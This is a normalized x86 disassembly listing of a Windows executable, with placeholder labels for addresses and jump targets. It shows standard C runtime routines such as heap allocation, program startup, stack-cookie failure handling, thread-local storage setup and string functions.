lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_404f01
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405051
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40500f
pop ecx
mov [ esi ] eax
pop esi
sub_404f3b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40573c
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_405051
test eax eax
je r-xdata
call sub_405051
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_404f7b
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_4054f0
pop ecx
call sub_405051
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_405c7e
push 0x1e
call sub_405acf
push 0xff
call sub_4057e9
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405051
mov [ eax ] esi
push ebx
call sub_4054f0
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405051
mov [ eax ] esi
sub_40500f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405074
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_405064
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4049cc
pop ecx
sub_405095
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_406340
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_4050de
push 0x58
push r--data
call sub_406c20
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40571e
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_405fb3
test eax eax
jne r-xdata
push 0x1c
call sub_4050b5
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_406bce
mov [ ebp - 0x4 ] esi
call sub_406989
test eax eax
jns r-xdata
push 0x10
call sub_4050b5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4068f2
mov [ rw-data ] eax
call sub_406837
test eax eax
jns r-xdata
push 0x1b
call sub_405a8b
call sub_4065c1
test eax eax
jns r-xdata
push 0x8
call sub_405a8b
push 0x1
call sub_40586a
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_405a8b
call sub_406562
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_405a8b
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_405a6d
jmp r-xdata
push eax
call sub_405a41
push ecx
push eax
push esi
push __dos_header
call sub_401000
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_406c65
retn
sub_405255
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_4052a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_406eaa
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_406eaa
pop ecx
sub_4053a7
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_406f91
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_406f43
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_406f43
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40545d
mov edi edi
push esi
push 0x4
push 0x20
call sub_406ef7
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40548e
push 0xc
push r--data
call sub_406c20
call sub_405801
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4053a7
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4054c4
mov eax [ ebp - 0x1c ]
call sub_406c65
retn
sub_4054f0
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_405518
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405051
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405051
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_4062b8
mov eax esi
jmp r-xdata
sub_405580
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40573c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405051
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_4054f0
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_4057be
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_405813
mov edi edi
push esi
call sub_405cb7
mov esi eax
push esi
call sub_4054e1
push esi
call sub_40612e
push esi
call sub_40741a
push esi
call sub_40740b
push esi
call sub_407206
push esi
call sub_4071f5
add esp 0x18
pop esi
retn
sub_405846
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40586a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_407429
push r--data
push r--data
call sub_405846
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_4074e0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_406bf4
call sub_4054ca
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_4074e0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_405901
push 0x20
push r--data
call sub_406c20
push 0x8
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405a2c
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_406c65
retn
mov [ rw-data ] 0x1
push 0x8
call sub_407065
pop ecx
push [ ebp + 0x8 ]
call sub_4057e9
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_405cb7
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_405cb7
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_405aa9
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_405acf
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_405aa9
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4049bd
leave
retn
push 0x3
call sub_4078c8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_4078c8
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_407865
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_405580
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_406266
push esi
call sub_40784a
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_407865
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_407708
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40784a
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_40777d
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_407708
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40759c
add esp 0xc
jmp r-xdata
sub_405c7e
push 0x3
call sub_4078c8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_405acf
push 0xff
call sub_405acf
pop ecx
pop ecx
push 0x3
call sub_4078c8
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_405cc9
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_405cfd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40700e
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_405d3a
push 0x8
push r--data
call sub_406c20
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405ddc
push 0xc
call sub_40713e
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_407907
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405de5
call sub_406c65
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_405dee
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_405cc9
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_406ef7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_404f01
pop ecx
xor esi esi
push 0x0
push esi
call sub_405d3a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_405e81
push 0x8
push r--data
call sub_406c20
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_406c65
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_404f01
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_404f01
pop ecx
push 0xd
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_404f01
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405f9b
push 0xc
call sub_40713e
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405fa7
push esi
call sub_404f01
pop ecx
push edi
call sub_407996
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404f01
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_407a2f
pop ecx
sub_405fb3
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_405cfd
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_405cc0
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_405813
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_406fc4
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_405cfd
mov edi [ DecodePointer@IAT ]
push sub_405e81
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_406ef7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_405d3a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_40613d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_4083b0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_406eaa
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4049bd
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_406eaa
pop ecx
sub_406266
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40613d
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_40628b
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406266
int3
pop ebp
jmp eax
sub_4062c8
push 0xc
push r--data
call sub_406c20
push 0xe
call sub_40713e
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40632f
call sub_406c65
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_404f01
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_404f01
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_406340
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4063c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_407171
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_406418
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405dee
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
